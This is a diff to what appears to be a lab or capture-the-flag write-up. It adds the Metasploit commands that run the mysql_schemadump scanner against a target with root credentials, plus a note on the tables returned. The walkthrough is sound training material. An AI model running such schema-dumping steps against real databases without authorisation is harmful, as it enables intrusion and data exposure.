@@ -332,9 +332,37 @@ First, I will search for and select the "mysql_schemadump" module.
 
 ![Screenshot (336)](https://github.com/user-attachments/assets/5048dbf0-a703-47f3-979d-70bea2a95324)
 
-The module's full name is auxiliary/scanner/mysql/mysql_schemadump.
+The module's full name is *auxiliary/scanner/mysql/mysql_schemadump*.
 
 Now, I will move on to set the relevant options, and run the exploit.
+
+**Commands used:**
+
+```bash
+use auxiliary/scanner/mysql/mysql_schemadump
+```
+
+```bash
+show options
+```
+
+```bash
+set RHOSTS <target-IP>
+set USERNAME root
+set PASSWORD password
+```
+
+```bash
+run
+```
+
+**Findings:**
+
+![Screenshot (337)](https://github.com/user-attachments/assets/b122ed04-4afc-443e-98ff-0cc937cd6193)
+
+Several tables were returned of which the last one's name was *x$waits_global_by_latency*
+
+
 
 
 
